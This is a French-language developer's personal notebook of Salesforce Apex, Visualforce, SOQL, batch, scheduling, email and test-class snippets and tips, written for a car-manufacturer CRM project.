               oncomplete="window.top.location='/{!Lead.id}'" // c le seul moyen! j'ai essaye plein de trucs en javascript impossible             
          pour faire un bouton de commande (si besoin faire un target, faire plutot un comamndlink)
                  <apex:commandButton action="{!createAccountFromLead}"
                                    rerender="theblock,messages"
                                    value="Create Account"
                                    status="miniLoadStatus" style="display:none" onclick="createAccountClicked=true"/>
                                      <script>
          pour faire un champ date il faut obligatoirement utiliser un custoom objet ou objet qui a ce champ date.
           l'appeller dans mon controlleur : 
                  public TechObjectVF__c dates {get;set;}
                  //constructeur : 
                   public SFA_Sellers_Report_CTR() 
                      {
                          dates = new TechObjectVF__c();
                      }
              Puis cote page :
                             <apex:inputField value="{!dates.Start_Date_Time__c}"/>
                              <apex:inputField value="{!dates.End_Date_Time__c}"/>    
                                                 
            pour faire un lien :
               <apex:outputLink id="detailslink" styleClass="buttonlink"
                                    target="_parent" value="{!URLFOR($Page.LMT_LeadCustomerDetails)}"
                                    disabled="{!lead.Account__c==null}">
                                    <input type="button"
                                        value="{!$Label.LMT_ApproachingAccounts_CustomerDetailsButtonLabel}" // translate, traduction (se font sous setting> custom labels)
                                        class="{!IF(lead.Account__c==null, 'btnDisabled', 'btn')}" />
                                    <apex:param name="id" value="{!lead.Id}" />
                                    <apex:param name="leadurl" value="{!URLENCODE(leadUrl)}" />
                                    <apex:param name="csmourl" value="{!URLENCODE(csmoUrl)}" />
                                </apex:outputLink><br/><br/><br/>
          Objets customises :
              Tout champ cree doit avoir une description
              
        une page peut faire un include d'une autre page qui en fait est un component exemple : LMT_SBOLAppointment_C  est une visualforce component
              je l'appelle comme ça  dans ma page visualforce:
                                     <c:LMT_SBOLAppointment_C lead="{!mLead}" Operations="{!sbolOpList}" message="{!$Label.LMT_OnlineEstimate_ConfirmEstimate}"/>
                            et voici mon component:
                            <apex:component id="LMT_SBOLAppointment_C" controller="LMT_SBOLCreateAppointment_EXT" allowDML="true"> // attention si dans mon controller je fais du DML(insert, update etc...) il faut setter allowdml=true 
                                  	<apex:attribute name="message" required="true" description="message to display next to get calendar function" type="String"/>
                                  	<apex:attribute name="lead" required="true" description="lead on which SBOL is based" type="Lead" ass
                                    (...)           
       pour rediriger vers une page d'envoi de mail : 
                                            location.replace('{!$Site.BaseUrl}/email/author/emailauthor.jsp?
                                            retURL={!$Site.BaseUrl}%2F{!ctr.opportunityId}  // rappel : %2F=/
                                            &template_id={!$Setup.CS02_SFA_Settings__c.Email_Template_Id__c}    // id du template de mail
                                            &p3_lkid={!ctr.opportunityId} // Related To dans le template de mail // Objet principal. NOMMEr du coup le tempalte d'email : ...OPP...
                                            &p2_lkid={!ctr.contactId}'); // Contact Id dans le template de mail // Destinataire du mail                                      
                                            &p4 = ... // CC
                                            &p5 = ...//Bcc
                                            &p6=... //Subject
                                            &p23=...// Email body.
                                            &p24 = ...//Additional emails.
                                            &p26 = from par defaut
          SERVLET : CONTROLLEUR : CLASSE
          pour creer une classe dans une classe : 
                          global class EmailSending{
                                          	public EmailSending(Id targetObject, Id template, Id what, Id orgWideEmailAddressId, Boolean saveAs){
                                          		this.targetObjectId = targetObject;
                                          		this.templateId = template;
                                          		this.WhatId = what;
                                          		this.saveAsActivity = saveAs;
                                                  this.orgWideEmailAddressId = orgWideEmailAddressId;
                                          	}
                                          	Id targetObjectId;
                                          	Id templateId;
                                          	Id WhatId;
                                              Id orgWideEmailAddressId;
                                          	Boolean saveAsActivity;
                                          }
          pour creer un person accout : 
                Account account = new Account(lastname='martin', firstname='paul', personemail='paul.martin@xxx.com', billingstreet='4 rue des Roses',
	    						billingpostalcode='35000', billingcity='RENNES', country__c='FRANCE', HomePhone__c='0321122112', 
	    						PersMobPhone__c= '0678766554', CompanyID__c = '11112222344455', 
	    						NbrAdultsHome__c = '2');
	    						L'objet Contact associe est automatiquement cree par Salesforce
          mettre en-tete : 
              /**
               * LMT/SFA CORE F1304 Test Drive
               * Scheduled every day, sends an email to contact that has an event test drive the next day. For Reminding.
               */
          pour faire des strings remplacement avec les custom labels resource concat:(voir string.format) 
                    string.format(System.Label.LMT_Email_InactivVehicle_Subject, new List<String>{lastName, firstName}); 
                    // où
                    Custom label LMT_Email_InactivVehicle_Subject =Mr/Mme {0} {1} n’est plus disponible
                    cote page visualforce apex faire : (voir page apex) 

              recuperer dynamiquement les champs d'un objet : 
                            String objectName = 'Lead';
                            Map<String, Schema.SObjectField> fMap = Schema.getGlobalDescribe().get(objectName.toLowerCase()).getDescribe().Fields.getMap();
                                      List<String> selectFields = new List<String>();
                                      
                                      if (fMap != null) {
                                          for (Schema.SObjectField ft : fMap.values()) { // loop through all field tokens (ft)
                                              Schema.DescribeFieldResult fd = ft.getDescribe(); // describe each field (fd)
                                              if (fd.isCreateable()) { // field is creatable
                                                  selectFields.add(fd.getName());
                                              }
                                          }
                                      }
            pour faire un split de string : 
                monstring..split('[|]'); 
              entete mettre le commentaire bonne pratique : 
              /**
                 *   Name    : LMT_LeadMassQuery_v2_CTR
                 *   Desc    : Custom Controller used by Visualforce page LMT_LeadMassQuery_v2
                 *   Author  : Ricardo BLANCO (Atos) / Laurent DUVERGE (Atos)
                 *   Project : SFA-LMT / User Story 909
                 **/
            methode pour faire une liste de string String[] :
                         String[] accountCategories = 'Affaire hors r&eacute;seau&#124;Agent Relais&#124;Agent Renault&#124;Concession&#124;Customer&#124;Etablissement RFA&#124;Groupe&#124;Plaque&#124;Point modulaire&#124;Point Modulaire Dacia INT&#124;Point Modulaire Dacia ISO&#124;Point Modulaire Sat DACIA&#124;Point relais&#124;P&ocirc;le&#124;Reparateur Agree Prive&#124;Site Annexe Agent&#124;Sous-p&ocirc;le&#124;Vendeur agr&eacute;&eacute;'.unescapeHtml4().split('[|]');
                         ou
                        String[] accountCategories = new String[cS28_SFA_Reports.size()];        
            pour concatener additionner deux listes tableaux : 
                               String[] toto = {};
                            String[] titi = {"sdf","esf"};
                            ArrayList<String> a = new ArrayList(Arrays.asList(toto));
                            ArrayList<String> b = new ArrayList(Arrays.asList(titi));
                            a.addAll(b); // attention methode ci dessous peut créer des exception si une des liste est vide:
                        // put all dealerschildsdealer  into dealers (list)
                            List<Account> allDealers new List<Account>(); (...)
                          allDealers.addall(dealers); allDealers.addall(dealerschildsdealer );  
                           
              pour recuperer l'id de l'utilisateur en cours :   ou bien c'est aussi l'id de l'utilisateur à l'origine du process
                  currentUser.AccountId ou bien UserInfo.getUserId() // quelle est la difference?
              attention dans toutes les classes apex appeler les custom objets en finissant par __c
              appeler une classe apex a partir du builder process : 
                    mettre en haut de ma classe :   
                        @Invokable Method
                        etcetcetc(List<Obj> blah)
              (...)
              with sharing :  
              without sharing (est par defaut Mais si non precise va d'abord chercher le meme mode que la classe appelante avant de choisir ce mode Sauf pour les Inner Class) : TOUTES PERMISSIONS read write partout
              public MaClasse()
              {
              // recuperer le request :
              ...ApexPages.currentPage().getParameters().containsKey("toto")...
              // faire une requete request http vers internet :
                  HttpRequest req = new HttpRequest();
                  req.setMethod("GET");
                  req.setEndPoint("http://etc etc....");
                  HTTP http = new HTTP();
                  HTTPResponse res = http.send(req);
                  return (MonOBjet)JSON.deserialize(res.getBody().replace('\\\'',''),MaClasse.class);
              }
          SOQL : sql :
          too many SOQL queries: 101 :
                eviter de faire des updates de pluieurs objets differents dans une meme liste car si gros volume à chaque fois il cree une requete pour un bloc de meme type d'objet 
          pour recuperer le ID d'un recordtype le mieux c'est de faire :
                      il ne faut pas faire de select mais utiliser le describe. et ne pas utilise le nom en dur mais utiliser les custom label:
                      AFAIRE pour etre propre : modifier classe LMT_Batch_EventEmailTestDrive_CLS ligne 11
          ATTENTION LIKE n'est pas case sensitive mais case INSENSITIVE!
            pour faire is not null c'est 
              !=null
            pour faire un like avec une variable 
                  String fnd = '%' + searchText + '%';
                  List<Lead> = [select id, name from Lead where name like :fnd];
              rownum limit 
                  pour recuperer sulement la deuxième ligne : 
                    select Id from Account limit 1 offset 1  (limit 1 pour recuperer qu'une ligne. Offset 1 pour commencer à partir de la 1ere ligne)
              pour inserer un objet
                  Opportunity op = new Opportunity();
                    op.Name='toto';
                    op.StageName='Customer Discovery';
                    op.CloseDate=Date.Today();
                    // pour definir une jointure op a un id de account. 
                        Id account = [select Id from Account limit 1].Id;
                        op.DealerofInterest__c = account;
                    insert op;
            pour faire un IN on ne met pas de parentheses : 
                  List<Contact> contacts = [select Id, Email from Contact where Id IN :whoids];        
            astuce : faire une boucle direct suite à un select: 
            for (Account currAcc : [SELECT Tech_ACCExternalID__c, Id  FROM Account WHERE RecordTypeId = :rtIdNetworkSiteAccount AND Tech_ACCExternalID__c IN :uniqueAccExternalIds]) 
            {
                accExternalIdToDealerMap.put(currAcc.Tech_ACCExternalID__c, currAcc);
            }    
            join jointures links liens : upwards downwards 
              Si j'ai : 
                    __r c'est une jointure et je peux mettre blablabla__r.champ_de_l'autretable ca va vers le HAUT le parent!
                    exemple :
                    select name, owner.account.RecordType.Name from contact (recherche le recordtype de l'account du owner du contact)
                    List<Opportunity> accountmails = [select account.PersEmailAddress__c, Id from Opportunity where Id in :whatids]; // ici pas besoin de mettre __r
                    Ou : List<Event> events = [select Event.Id, vehicle__r.VehicleBrand__c from Event] Dans workbench description objet il y a sur Event : relationshipName: vehicle__r
                        puis 
                        toadd.email=accountmails[j].account.PersEmailAddress__c;
                  ou 
                  SELECT id, Account.Owner.Contact.accountid, DealerofInterest__c FROM Opportunity where Account.Owner.Contact.accountid !=null LIMIT 1000 
                // sur workbench il faut activer  : settings>Allows SOQL Parent Relationship Queries    
              ne pas faire de SOQL dans les boucles
          Trigger :  (exemple : chatter blacklist words)
              trigger MonTriger on MaClasse__c(before insert, before update)
              {
              if (Trigger.isBefore){}
              if (Trigger.isInsert){}
              
              }
              pour bypasser un trigger : 
                     TriggerAdministration.updateBypassTriggers(MesObjetsAMettreAJourSansDeclancherLesTriggers, true);
          POUR FAIRE DES JOBS SCHEDULES
          Schedulable interface : (crontab taches regulieres)
                global with sharing class MaClasseSchedule implements Schedulable
                {
                //constructeur
                global MaClasseSchedule(){}
                //execute
                global void execute(SchedulableContext ctx)
                {
                  MaClasse.faitCa();
                }
              ensuite dans settings>apexclass > bouton schedulable apex on peut programmer l'execution du scheduleclass
              on peut aussi programmer son schedule job en executant de manière anonyme ça : 
                        // - 22/10/2015 (DD/MM/YYYY) @ 11H30:
                        System.schedule('Send Email to client one day before test drive', '0 30 09 ? * * *', new LMT_Schedulable_EventEmailTestDrive());
                        System.schedule('Ventilate leads equitably 22/10/2015 (DD/MM/YYYY) @ 11H30', '0 30 11 22 10 ? 2015', new MaClassSchedule());  
                                                                    Seconds Minutes Hours Day_of_month Month Day_of_week optional_year
                                                                    0-59    0-59    0-23    voir https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_scheduler.htm
                                                                                      
                  on peut ensuite les editer voir supprimer dans settings>scheduled jobs
              Si on veut directement scheduler un batch alors c'est plus facile de faire : Le problème avec ça c'est qu'on ne peut pas definir le moment de la première execution
                       LMT_Batch_EventEmailTestDrive batch= new LMT_Batch_EventEmailTestDrive(); 
                      String cronID = System.scheduleBatch(batch, 'MonBatch', 60*24); // dernier argument = minutes
              Enfin le faire avec PointAndClick : 
                    Classes>ScheduleApex... mais c'est un peu limite
              pour les supprimer tous si on arrive pas a sauver une classe : 
                              List<CronTrigger> listCronTrigger = [select Id, CronExpression, EndTime, NextFireTime, OwnerId,
                              PreviousFireTime, StartTime, State, TimesTriggered, TimeZoneSidKey from CronTrigger
                              where State = 'Waiting' or State='Running'];
                              System.debug('No of jobs: '+listCronTrigger.size());
                              If (listCronTrigger.size() > 0)
                                {
                                    for (Integer i = 0; i < listCronTrigger.size(); i++)
                                    {
                                        System.abortJob(listCronTrigger[i].Id);
                                        System.debug('Job details ::'+String.valueOf(listCronTrigger[i]));
                                    }
                                }
                                    
                      
                      
                  

          Dates :    
              DateTime.now().addDays( 2 );    // soustraire: addDays(-50)
              Date.now().addDays( 2 );  voir aussi datehahaha ci dessous
          Array :
              List<String> colors = new List<String> { 'red', 'green', 'blue' };
              List<String> moreColors = new List<String>();
                moreColors.add('orange');
          Boucle : // ne pas faire de SOQL dans les boucles parcourir for
            boucle pour recuperer la cle et la value : 
                for (Id id : mailContainer.keySet())
                  {
                      System.debug(id);
                      System.debug(mailContainer.get(id));
                  }
            boucle simple :
                    for(Integer i=0;i<colors.size();i++) 
              {
                  // Write value to the debug log
                  system.debug('opid'+op.id);
                  System.debug(colors[i]);
                  
              }
            
              Bulkify une boucle :
                  boucle sur l'ojet en cours pour 
                  faire un tableau avec l'objet en cours
                  faire plein de maps tableau avec tous les objets necessaires commme ça:
                        List<B> potentialB = [SELECT Id, Email FROM B WHERE Email IN :allEmails];
                        List <User> potentialOppOwnerMgrs = [SELECT Id, ManagerId FROM User WHERE Id IN :allOppOwnerIds];
                        Map<Id, User> mUsers = new Map<Id, User>([Select Profile.Id from User where Id IN :lUserId]);
                        Map<Id, Group> mQueues = new Map<Id, Group>([Select DeveloperName from Group where Id IN :lQueueId]);
                        Map<String, IdowadaciaIdowarenault> countryToIdOwa = new Map<String,IdowadaciaIdowarenault>(); // map vide 
                  fin boucle 
                  REFAIRE boucle sur l'objet en cours pour avec les tables traiter la partie logique.
       pour faire un batch :
            DANS LE CONTROLLEUR : 
            // creer un LeadInfo dans la base pour stocker temporaiement l'etat du batch : 
              LeadInfo__c leadInfo;
              leadInfo = new LeadInfo__c(.. differents paramettres à mettre ici... Le statut du batch initialise à "NotRunning" par exemple + ce que je veux... Ce sera recupere apres dans le batch....);
              insert leadInfo;
              (....)
            // verifier que le batch ne tourne pas dejà avant de l'executer : 
              if (checkBatch()==true)
              {
                    /// on va demarrer le batch
                    LMT_Batch_LeadMassQuery_v2 batch = new LMT_Batch_LeadMassQuery_v2(leadInfo, leadsToProcess); // leadInfo est un objet issus de la database qui sert à conserver temporairement l'etat du batch.; leadsToProcess est la liste des choses à traiter 
                    Database.executeBatch(batch, 200); // 200 ca veut dire qu'il en fait par lot de 200
               }     
                    
        private boolean checkBatch() 
        {
              // Search existing leadInfo
              List<LeadInfo__c> leadInfos = [SELECT Id, User__c, Status__c FROM LeadInfo__c WHERE User__c = :UserInfo.getUserId()];
              for (LeadInfo__c li : leadInfos) 
              {
                  if (!li.Status__c.equals('Completed OK') && !li.Status__c.equals('Completed KO')) 
                  {
                      return false;
                  }
              }
              return true;
        }
        
        LA CLASSE BATCH :
        global class LMT_Batch_LeadMassQuery_v2 implements Database.Batchable<sObject OU un autre objet**>, Database.Stateful
        // ATTENTION!! Chez renault à la place faut etendre extends INDUS_Batch_AbstractBatch_CLS et aussi il faut rajouter le logger dans CS22_INDUS_Logger 
        {
                  // constructeur :
                           public LMT_Batch_LeadMassQuery_v2 (LeadInfo__c leadInfo, List<Lead> leads) 
                           {
                                  this.customleads = leads;
                                  this.leadInfo = leadInfo;
                            }
                // trois methodes à implementer start, execute et finish : 
                        //Start :  exemple : comme on etend INDUS_Batch_AbstractBatch_CLS, il faudra mettre qqchose comme for (Event event : (List<Event>)events) : typage 
                            global Iterable<sObject OU un autre objet**> start(Database.batchableContext BC) 
                            {
                              List<Lead> so = customleads; // peut etre que faire directement return customLeads aurait suffit.
                              return so;
                            }
                      // Execute :
                             global void execute(Database.BatchableContext BC, List<Lead> scope) // scope correspond au return du start
                             {
                                   (... mon traitement....)
                                    try 
                                    {
                                              Database.update(leadsToUpdate, false);
                                    } 
                                    catch (Exception e) 
                                    {
                                              System.debug('#### LMT_Batch_LeadMassQuery_v2 - Lead update : error ' + e.getMessage());
                                              // pour avoir le stacktrace : e.getStackTraceString();
                                              this.leadInfo.Status__c = 'Completed KO';
                                    }
                              }    
                       //Finish :
                                    global void finish(Database.BatchableContext BC)
                                    {
                                         // get status information
                                          AsyncApexJob a = [SELECT Id, Status, JobType FROM AsyncApexJob WHERE Id = :BC.getJobId() AND JobType <> 'BatchApexWorker'];     
                                          if (a.Status.equals('Completed')) 
                                          {
                                              this.leadInfo.Status__c = 'Completed OK';
                                          }
                                          else 
                                          {
                                            leadInfo.Status__c = 'Completed KO';
                                          }
                                          update leadInfo;    
                                         sendEmail(); // eventuellement
                                        System.debug('#### LMT_Batch_LeadMassQuery_v2 - Finish - End');        
                                      }
           pour executer le batch : 
                  LMT_Batch_EventEmailTestDrive batch= new LMT_Batch_EventEmailTestDrive();
                    Database.executeBatch(batch, 200); // le start va renvoyer des listes de 200                                      
                                                      
        pour effectuer demarrer un traitement à la reception d'un email intercepter catcher detecter de l'exterieur vers salesforce : 
                faire une classe qui implemente Messaging.InboundEmailHandler
                voir doc : https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_classes_email_inbound_using.htm
                global class CreateTaskEmailExample implements Messaging.InboundEmailHandler {
                                          global Messaging.InboundEmailResult handleInboundEmail(Messaging.inboundEmail email,
                                                                                               Messaging.InboundEnvelope env){
                                            // Create an InboundEmailResult object for returning the result of the
                                            // Apex Email Service
                                            Messaging.InboundEmailResult result = new Messaging.InboundEmailResult();
                                            String myPlainText= '';
                                            // Add the email plain text into the local variable
                                            myPlainText = email.plainTextBody;
    pour envoyer un email : 
               Messaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();
              //eventuellement recuperer le/les templates d'email qui nous interesse : 
                  List<Id> emailTemplateId = [select id from EmailTemplate where DeveloperName='My_Email_Template'].id;  
              
               ou envoi en masse : 
              List<Messaging.SingleEmailMessage> mails = new List<Messaging.SingleEmailMessage> ();
                     for(User sysAdminUser :[Select id from user where ProfileID IN:userProfile]) {
                                 Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage(); (...)

                    email.setTargetObjectId(usrEvt.OwnerId);     // destinataire
                    ou bien mais seulement si c pas par template. Sinon si c un template il faut quand meme setter le settargetobjectid
                    List<String> addresses=new List<String>{evt_dest.destEmail};
                    email.setToAddresses(toAddressesEST UNE LISTE!) //The maximum number of email addresses allowed is 100.
                    email.setSaveAsActivity(false);
                    
                    //email.setSenderDisplayName(Label.LMT_Object_QueryBatchEmail_NameTransfer); ** voir labels plus haut
                    String mailSubject ; String mailBody; String firstName ; String lastName ;
                    if(usrEvt.AccountId != null || usrEvt.WhoId != null){
                        firstName = usrEvt.AccountId != null ? Accts.get(usrEvt.AccountId).FirstName : leadNames.get(usrEvt.WhoId).FirstName ;
                        lastName = usrEvt.AccountId != null ? Accts.get(usrEvt.AccountId).LastName : leadNames.get(usrEvt.WhoId).LastName ;
                    }
                    if(firstName == null){ firstName = ' ' ; }
                    if(lastName == null){ lastName = ' ' ; }
                    mailSubject = string.format(System.Label.LMT_Email_InactivVehicle_Subject, new List<String>{lastName, firstName}); (voir string.format)
                    
                    if(vehMaintenance == null){
                        mailBody = System.Label.LMT_Event_TestDriveOverlap_Subject;
                    } else {
                        mailBody = string.format(System.Label.LMT_Email_MaintenanceVehicle_Body (voir string.format) 
                                                    , new List<String>{
                                                        firstName, lastName
                                                            , string.valueOf(usrEvt.StartDateTime.Date()), string.valueOf(usrEvt.StartDateTime.Time()), string.valueOf(usrEvt.EndDateTime.Time()) 
                                                            , vehs.get(vehId).EngineType__c, vehs.get(vehId).VehicleBrand__c
                                                            , string.valueOf(vehMaintenance.get(vehId).StartDateTime.Date()), string.valueOf(vehMaintenance.get(vehId).StartDateTime.Time())
                                                            , string.valueOf(vehMaintenance.get(vehId).EndDateTime.Date()), string.valueOf(vehMaintenance.get(vehId).EndDateTime.Time()) });
                    }

                    email.setSubject(mailSubject);
                    
                    email.setHtmlBody(mailBody);
                    OU  
                    List<EmailTemplate> emailTemplateId = [select Id from EmailTemplate where DeveloperName='EventEmailTestDrive'];  
                  email.setTemplateId(emailTemplateId); // eventuellement
                  email.setTargetObjectId(The ID off the contact, lead, or user destinataire du mail. The ID you specify sets the context and ensures that merge fields in the template contain the correct data.)
                                            il va chercher dans contact le champ email standard: procedant ainsi on est pas limite en nombre d'envoi de mail. Par contre si on utilisait l'adresse email direct on est limite.
                  email.setWhatId(If you specify a contact for the targetObjectId field, you can specify an optional whatId as well. This helps to further ensure that merge fields in the template contain the correct data.)
                  email.setReplyTo(event_contact.event.AssignedTo); // ne pas utiliser si on utilise les templates email: avec les templates c'est reporte dans le template
                            Dans Template de mail :  
                                        <messaging:emailTemplate 
                                             subject="Test Drive Meeting" 
                                             recipientType="Contact(Type d'objet mis dans getTargetObjectId)" // Destinataire d'email.
                                            relatedToType="Opportunity(Type d'objet mis dans WhatId)"   // Objet principal. NOMMEr du coup le tempalte d'email : ...OPP...
                                            language="{!recipient.language__c}" // donc Contact.language__c
                                            replyTo="support@acme.com">
                                            replyTo="{!IF(BEGINS(relatedTo.OwnerId, '00G'), 'MAEVA - Lead internet à traiter en urgence', 'Lead : ' + relatedTo.Salutation + ' ' + relatedTo.FirstName + ' ' + relatedTo.LastName + ' est à traiter en urgence.')}" relatedToType="Lead" recipientType="Lead" 
                                                <messaging:plainTextEmailBody >
                                              Congratulations! {!relatedTo.Id} // donc Opportunity.Id
                                               {!$Label.EService_Email_Case_Creation_M_Lang_1} // on peut mettre des libelles (internationalisation traduction)
                                             </messaging:plainTextEmailBody>
                                              </messaging:emailTemplate>
                    // pour les envois en masse:
                    emails.add(email);
                    System.debug('#### SFA_TestDriveEventUtils_CLS - sendEmailVehicleInactive:' + email);
                }
            }
            Messaging.sendEmail(emails);                                                            
      appel a un webservice 
                public String getAccountInfo(String vin,String Registration,String country,String LastName,String firstName,String brand,String email, String City, String ZipCode, String idClient){
            String strBody;
            HttpRequest req = new HttpRequest();
            req.setMethod('GET');
            req.setEndpoint(System.label.BcsWsUrl);
            req.setClientCertificateName(System.label.clientcertnamex);
            req.setTimeout(120000); 
            req.setHeader('Content-Type', 'application/soap+xml; charset=utf-8');
            req.setHeader('SOAPAction', '"document/http://siebel.com/CustomUI:getCustData"');
            req.setHeader('Keep-Alive', '1115');
            req.setHeader('Accept', 'text/xml');
            req.setHeader('User-Agent', 'SFDC-Callout/26.0');
            
          String requestStr = ''
          +'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cus="http://siebel.com/CustomUI" xmlns:cus1="http://custdata.crm.bservice.renault">'
          +'</soapenv:Envelope>';
              req.setHeader('Content-Length', String.valueOf(requestStr.length())); // c la taille du nombre de caracteres ca permet au client de savoir que tout le contenu a été bien recu sinon il continue a ecouter LINKcontentlengh
              req.setBody(requestStr);
              Http http = new Http();
              try {
                  //Execute web service call here
                  System.debug('REQUEST='+req.toString());
                  System.debug('REQUEST='+req.getBody());      
                  HTTPResponse res = http.send(req);  
                  //Helpful debug messages
                  System.debug('STATUS='+res.getStatus());
                  System.debug('STATUS_CODE='+res.getStatusCode());
                 
                  strBody = res.getBody();
                  System.debug('Response String>>>>>>>>>'+strBody );
                  System.debug('STATUS CODE'+res.getStatusCode());
      pour debugger debuger
          dans la classe :
            system.debug(logginglevel.WARN, 'YOUR VARIABLENAME' + variableName);
            system.debug('test phone : '+lead.Phone__c);
            ou 
            System.debug('#### LMT_LeadApproachAccs_EXT - getKnownWarningMessage - Message received:' + mdmMsg);
          interface : 
              setup>debug>new> mon nom et prenom > loupe > je peux faire mes tests et sur cette page je verrais 20 nouveaux fichiers de logs (limite)
     CLASSE DE TEST
          declaration :
              @isTest
              public class SFA_Sellers_Report2_TEST
              {
            ma methode de setup qui initialise les donnees pour chaque methode de test : tests : 
                  @testSetup
                  static void setUp(){ (...)
            une methode
                      static TestMethod void Test1_TestInsertWithoutValue() 
                      {
                        je prepare mon test..ici.... 
                      (...)
                      Test.startTest();
                        ici les limites (nb de sql autorises etc... ) sont remises à zero donc je peux refaire 100 requetes
              Si ma classe de test doit appeler une methode privee d'une autre classe: pour qu'elle soit accessible à ma classe de test, mettre l'annotation 
                  @testIsVisible
                  private maMethodePrivee...                          
           TEST : tests : les asserts :
              exemples : 
                  Test.startTest(); // les limites de requetes sont reinitialisees
                      ...executer le code...
                  Test.stopTest(); // les limites sont remises à avant
                      System.assertEquals(null, pg); // mettre les assertions apres le stoptest
                      System.assert(!ct.authorized);
                      System.assertNotEquals(null, pg);
                      System.assertNotEquals(null, ct.opportunityId);
                          
                pour bien voir l'evolution des tests: setup > apex test execution ou bien dans la console: laurent > dev console onglet test
                  
      pour tester une classe: 
          plutot le faire via le web: trouver classe > run test (qd j'ai modifie une classe le coverage passe à 0%)> cela va recalculer le coverage
          mettre mes nouvelles methodes en tete de classe pour voir les systemout que j'ecris dans les debugs logs
      pour tester un batch : 
               Test.startTest();
                      	  LMT_Batch_EventEmailTestDrive batch = new LMT_Batch_EventEmailTestDrive(); 
                          Database.executeBatch(batch, 200); 
          Test.stopTest(); // important à mettre après execution du batch
          mettre les asserts ici! // important à mettre après execution du batch    
     pour voir la couverture de mes tests : 
              console de dev puis bouton "code coverage"
                    si ca ne marche pas Dev console decocher test>always run asynch ( du coup il va faire les tests dans le poc commun. Plus lent mais au moins c'est globalise)
                                                  si je coche test>alays run async  il fait un appel de la console de dev pour executer que ma classe de test sans la mettre dans le pot commun: ca peut être a l'origine d'un mauvais code coverage couverture. 
                                                  autre option : Dans UI : Apex test execution > options... cocher Disable parallel apex testing pour qu'il execute les tests dans le bon ordre
                                                                          Apex test execution > options... decocher Disable parallel apex testing : il va executer les tests en même temps sans respecter un ordre du coup ca peut generer des erreurs de tests qui ne sont pas des erreurs. (tests interdependants)
                                                  Dernier recours : Apex test execution > View test History et clear l'historique mais c embettant car il supprime tout les calculs de coverage. Il faut reexecuter TOUS Les tests avec Disable Parralel apex testing coche bien sur puisqu'on reexecute tout
          
            2.	Les classes de test doivent passer independamment du Rôle de l’utilisateur qui les lance   PLUS MAINTENANT
                          1.	Les classes de test doivent passer independamment du Default Country de l’utilisateur qui les lance. PLUS MAINTENANT
                        La classe LMT_TestUtils_TEST contient toutes les methodes necessaires pour creer/modifier un compte en respectant son pays.
                      Merci de bien vouloir les utiliser.
                            exemple :   
                             static testMethod void testOnBeforeInsert(){
                                  System.runAs(LMT_TestUtils_Test.getCurrentuser()){
                                    //-- create queue
                                    LMT_TestUtils_Test.createQueue(TEST_QUEUE_NAME);
                                  }
                      Pour assurer les règles de visibilite des comptes en conformite avec la realite, 
                      les structures reseaux doivent être instanciees avec des utilisateurs ayant le bon rôle (France pour le reseau français).
                      La classe LMT_TestUtils_TEST contient toutes les methodes necessaires pour creer les structures reseau – comptes, user. 
                      Merci de bien vouloir les utiliser.
                      Note : les rôles community ne sont pas encore bien geres par ces methodes
                      tous les users sont crees avec le role community ‘<Concession> Partner User’.
                      Si besoin, l’evolution peut être envisagee.
                       
                      3.	Les classes de test doivent passer independamment de la locale de l’utilisateur qui les lance PLUS MAINTENANT
                      Il faut eviter de prejuger du format des dates. Ainsi si vous voulez comparer des dates, ne pas utiliser une comparaison du type :
                      System.equals(‘21/09/2015’, madate.format()) mais bien preciser le format explicitement ou bien comparer jours, mois puis annee.
                      datehahaha .format() sert à ecrire la date au bon format de langue
                             
                      5.	Les classes de tests non mises à jour
                            Nous en avons rencontre un certain nombre qui font perdre pas mal de temps à Emmanuelle lors des livraisons.
                            Même si nous recevons regulièrement de la part de l’equipe d’integration un releve regulier de l’execution des tests
                            sur certaines de nos plateformes, il est preferable que chaque developpeur pense à corriger les classes de tests qui 
                            pourraient avoir ete impactees par ses developpements et ses corrections.
                             En general, chaque classe a un pendant dans les classes de tests unitaires qui porte le même nom suffixe par _TEST. 
                             Pour les trigger, chaque objet a sa classe de test de triggers.
      
      
      pour tester qu'une page renvoit bien un message apex visual page 
                      for(Apexpages.Message currMsg : msgs) 
                      {
                        if (currMsg.getDetail().contains(System.Label.SFA_NoUserInUserPickList)) 
                        {
                            b = true;
                        }
                      }
                    System.assert(b);
    CUSTOM SETTINGS est dans le cache: pas besoin de requeter 
      les nommer comme ça : 
            CS<numero> (on en est à 28)
            puis ensuite pour les utiliser dans un controller 
              String statusList = CS03_LMT_Settings__c.getInstance().Opportunity_Status_No_Duplicate__c;
              ou 
                  for (Country_info__c cf : Country_info__c.getAll().values()){ 
              ou (mais privilegier methodes precedentes!)NON ne pas faire ci dessous! Sauf dans un batch ou ce n'est pas grave
            CS27_SFA_Reports__c[] reports = [SELECT Id__c, Name FROM CS27_SFA_Reports__c WHERE Activity__c like :activityWildcard];
           pour les utiliser dans une page apex ou component : 
                  {!$Setup.CS02_SFA_Settings__c.Email_Template_Id__c}      
      les methodes utiles pour requetter au lieu de le faire par select: on peut tout recuperer de la memoire rame sans faire appel à la base :
                List<mon_custom_setting__c> mcs = mon_custom_setting__c.getall().values();

      
      TRADUCTIONS : pour exporter les traductions, libelles labels 
          menu:translation workbench    >export
          pour utiliser les traductions dans les visualforcepage : 
          {!$ObjectType.Lead.Fields.Account__c.Label} (si je veux utiliser une traduction quelquconque. Voir aussi "translate, traduction" au dessus)
          par exemple si dans fichier exporte
          j'ai : CustomField.Case.Dealer.FieldLabel	Dealer	Affaire	-
                mettre :
                {!$ObjectType.Case.Fields.Dealer__c.Label}
          si j'ai CustomLabel.LMT_SearchVehicle_TypRel_User
                mettre 
                {!$Label.LMT_SearchVehicle_TypRel_User}           
      questions :     
      possible debuggger avec breakpoint sur le devweb?
      anonymous console permet de d'executer des methodes de classes de tests?
                    Cours|exercice
           
        avant tout ...|105
        date fields 30;15|...
        field dependencies select choix 16;17;18|5;4
        traduction des libelles labels : settings >Translation Settings : attention  ici les pages next et previous servent à naviger DANS LES SOUS-LISTES
        id field 13|...
        fields of field or field structure, external id 19|...
            attention edit clicable | nom clickable : pas le meme comportement
        lookup, master detail 26,25,21,22,23,30,79,76|6;8;51
        junction object relation n-n ...|10
        self relation ship 25|...
        se loguer en tant que ...|36 
        roll up summary fields (Somme) 51;22;17;
